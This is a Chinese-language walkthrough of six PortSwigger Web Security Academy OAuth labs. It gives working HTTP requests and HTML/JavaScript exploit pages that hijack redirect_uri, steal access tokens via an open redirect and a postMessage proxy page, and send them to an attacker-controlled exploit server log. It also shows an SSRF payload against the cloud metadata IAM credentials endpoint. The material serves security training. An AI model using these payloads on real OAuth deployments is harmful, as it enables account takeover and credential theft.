# OAuth authentication

[toc]

## 1. Authentication bypass via OAuth implicit flow

在登陆的过程中可以看到这样一个POST请求：

```http
POST /authenticate HTTP/1.1
Host: ac431f011f08d88680e820f7009c004e.web-security-academy.net
Cookie: session=KulxzoQLZUMiDbWTU6Gp1kCDZAjsm6Fo
Content-Length: 113
...

{"email":"carlos@carlos-montoya.net","username":"carlos",
"token":"z1sTuU10ODvO5aESaedarRjbrZETn6D5ButNQEuL0yy"}
```

这里需要email和username以及一个token，token用自己的就可以了，然后将username和email改成carlos的，就可以登陆carlos的账户了。

## 2. Forced OAuth profile linking

我先是进去绑定社交帐号，然后退出。

然后用社交帐号登陆，竟然直接就进去了？不需要验证吗？奇奇怪怪。

查看报文的时候发现登陆用的ID，是用的我们认证时的那个ID。

我们的目的是要登陆管理员账号。那我们可以让管理员用他的账户绑定我们的社交帐号，然后进去。

那我们可以先认证自己的账户，然后链接的时候链接管理员的账户。

把下面这个包拦截，丢弃，保存他的code。发给管理员来连接。

```http
GET /oauth-linking?code=qAwlbMVLnOAjj0aWlNBV-MDlaeHunHBi6DMNLmEneUN HTTP/1.1
...
```

![2.1](OAuth-authentication.assets/2.1.png)

然后进去删除账户就好了。

## 3. OAuth account hijacking via redirect_uri

这个题目正常登录之后，再次登陆就可以直接进去了。

感觉如果让受害者直接登陆，然后劫持他的oauth-callback，感觉可以登陆进去。

```http
GET /auth?client_id=uf5u0jrfiseejy43hxywk&redirect_uri=https://acc21f661e9566c180cc1bdc0028005b.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: aca51f2e1ed166d480e81b4a02f80012.web-security-academy.net
```

但是直接加这个，好像有点问题。因为responce不会发送到我们的exploit里面。尝试将redirect_uri参数改成exploit（这里是redirect_uri的值会改变后面重定向的url）。

```html
<iframe src="https://aca51f2e1ed166d480e81b4a02f80012.web-security-academy.net/auth?client_id=uf5u0jrfiseejy43hxywk&redirect_uri=https://accd1f8c1e12660580881b17016000b2.web-security-academy.net/exploit&response_type=code&scope=openid%20profile%20email"></iframe>
```

发送给受害者之后，查看一下log。

然后看到了一堆code的值。然后直接用原本应该的那个报文登陆进去。

然后删除账户就好了。

## 4. Stealing OAuth access tokens via an open redirect

因为要交API key，所以先去找了找api key在哪。api key是下面这个报文的应答。并且发现这里的`Authorization: Bearer`后面的参数是请求`/auth?`返回的那个重定向的`#`后面的参数`access_token`的值。

```http
GET /me HTTP/1.1
Host: acbc1f801e6a6ff7823f1e5b023800fe.web-security-academy.net
Authorization: Bearer J7txiu--FIQ7af-28WjOOy7A1OciAD69SsJojRcxz9a
```

```
{"sub":"wiener","apikey":"uR4yr0qxKI4mGoiaToG6z5POaEYQbTw2","name":"Peter Wiener","email":"wiener@hotdog.com","email_verified":true}
```

这个靶场是一个开放重定向，通过redirect_uri参数来控制的。

登陆一次之后，再次登录不再需要用户名和密码。并且在登陆的时候依旧会发送上面那个报文。

然后尝试重定向的uri能不能直接指向exploit，发现不能。

经过尝试，发现uri前面必须是`https://ac591f091e096fd382801e3a00d3002b.web-security-academy.net/oauth-callback`。但是后面好像可以随便加。

在Post页面发现了这个：`/post/next?path=/post?postId=10`

> 目录遍历的技巧来提供域上的任何任意路径。就像这样。
>
> `https://client-app.com/oauth/callback/../../example/path`

```http
GET /auth?client_id=ox5eb9gwefi89760jpnsk&redirect_uri=https://ac591f091e096fd382801e3a00d3002b.web-security-academy.net/oauth-callback/../post/next?path=https://ac4f1f531e966f5f82bd1e78013200fc.web-security-academy.net/exploit&response_type=token&nonce=-332014228&scope=openid%20profile%20email HTTP/1.1
Host: acbc1f801e6a6ff7823f1e5b023800fe.web-security-academy.net
```

用浏览器访问这个，成功返回了`Hello, world!`，但是用repeater一步一步的来不行，貌似是不解析`/oauth-callback/../post/next?path=xxx`，但是在浏览器里面的时候，发送报文的时候就会直接访问`/post/next?path=xxx`，就可以跳转过去。

虽然成功跳转过去了，但是发现＃后面的参数没有了，因为请求的时候就没带上。而且我看报文里也没有地方包含了。

> [URL的井号 - 阮一峰的网络日志 (ruanyifeng.com)](https://www.ruanyifeng.com/blog/2011/03/url_hash.html)
>
> \#(hash)是用来指导浏览器动作的，对服务器端完全无用。所以，HTTP请求中不包括#。
>
> window.location.hash这个属性可读可写。读取时，可以用来判断网页状态是否改变；写入时，则会在不重载网页的前提下，创造一条访问历史记录。

于是我就又在exploit里面将参数重新给发送了一下。

```html
<script>
fetch("/aaaa/" + escape(window.location.hash));
</script>
```

现在就是去窃取管理员的后面那一串token了。

```html
<script>
if (window.location.hash) {
fetch("/aaaa/" + escape(window.location.hash));
}
else {
window.location="https://acbc1f801e6a6ff7823f1e5b023800fe.web-security-academy.net/auth?client_id=ox5eb9gwefi89760jpnsk&redirect_uri=https://ac591f091e096fd382801e3a00d3002b.web-security-academy.net/oauth-callback/../post/next?path=https://ac4f1f531e966f5f82bd1e78013200fc.web-security-academy.net/exploit&response_type=token&nonce=-2103099315&scope=openid%20profile%20email";
}
</script>
```

获取到管理员的token。

```
%23access_token%3Df9Z-q5_tRkvmR1kw2yWOg1RhXLGtJJd4ygnwfDolj8m%26expires_in%3D3600%26token_type%3DBearer%26scope%3Dopenid%2520profile%2520email
```

获取了token之后，将`GET /me HTTP/1.1`里面的值更改了就可以得到Key了。

## 5. Stealing OAuth access tokens via a proxy page

这道题也是将`GET /auth`返回的token放到`GET /me`的`Authorization`里面，就可以得到Key了。（和上面一样。）

只是这次的利用链可能长亿点。这次没有开放重定向了。

在burp里面看到了这个`/post/comment/comment-form`。

```html
<script>
    parent.postMessage({type: 'onload', data: window.location.href}, '*')
    ...
</script>
```

这个将`window.location.href`通过`postMessage()`发送到它的父窗口。

那么可以在exploit里面创建一个指向`/auth?`的iframe，然后用目录遍历的方法，把url指向`/post/comment/comment-form`，然后父窗口也就是`exploit`会收到message。

所以在exploit里面再添加一个监听器，来监听发送到父窗口的message。

```html
<iframe src="https://acf11f381e6eb2db80311ac5025900ff.web-security-academy.net/auth?client_id=crv4ygfeu886tmd4x4ikd&redirect_uri=https://ac521fd91efcb21480651ab600a600df.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1956930677&scope=openid%20profile%20email"></iframe>

<script>
window.addEventListener("message", function(m) {
fetch("/aaaa/" + btoa(m.data.data))
});
</script>
```

将`window.location.href`进行base64编码之后再传给log，这样就可以避免#后面的东西没了。

发送给受害者。

然后将获得的base64编码的东西解码，得到了token。

```
https://ac521fd91efcb21480651ab600a600df.web-security-academy.net/post/comment/comment-form#access_token=tJA9pGyTVtmRNLrHA8qpPYWDchXjaeN6tAX42yQ96Us&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

然后和上面一道题一样，直接更改`GET /me`的报文就好了。

## 6. SSRF via OpenID dynamic client registration

> To solve the lab, craft an [SSRF attack](https://portswigger.net/web-security/ssrf) to access `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/` and steal the secret access key for the OAuth provider's cloud environment.

> You may also be able to access the configuration file from the standard endpoint `/.well-known/openid-configuration`

在认证的Host那里，访问`/.well-known/openid-configuration`。

可以看到：

```json
{
    ...
    "issuer":"https://acc21f0f1f7eef0980a66660021300c1.web-security-academy.net",
    "jwks_uri":"https://acc21f0f1f7eef0980a66660021300c1.web-security-academy.net/jwks",
    "registration_endpoint":"https://acc21f0f1f7eef0980a66660021300c1.web-security-academy.net/reg",
    "response_modes_supported":["form_post","fragment","query"]
	...
}
```

其中`"registration_endpoint":"https://acc21f0f1f7eef0980a66660021300c1.web-security-academy.net/reg",`

然后向OAuth服务注册你自己的客户端应用程序，至少提供一个redirect_uris数组，其中包含一个任意的回调URI的白名单。而且在请求认证的时候，我们访问了一个logo：`/client/fke8hu1ziy5r6ic9pri2u/logo`，而这个logo是服务器去访问一个uri（这里如果可以改uri则会造成SSRF），然后再返回到页面上，而我们注册的时候是可以定义logo的uri的。

```http
POST /reg HTTP/1.1
Host: acc21f0f1f7eef0980a66660021300c1.web-security-academy.net
Content-Type: application/json

{
  "redirect_uris" : [
    "https://xxxx"
  ],
  "logo_uri": "https://dr8um8c3tun2k0n7bb59warfz65wtl.burpcollaborator.net"
}
```

发送出去会获得一个`"client_id":"2oEksGz1vnQ-L64K3Fz_l"`，然后访问logo。

```
/client/2oEksGz1vnQ-L64K3Fz_l/logo
```

然后发现确实访问了burpcollaborator。

将uri改成`http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/`。

然后尝试访问。

访问成功，然后提交SecretAccessKey就可以了。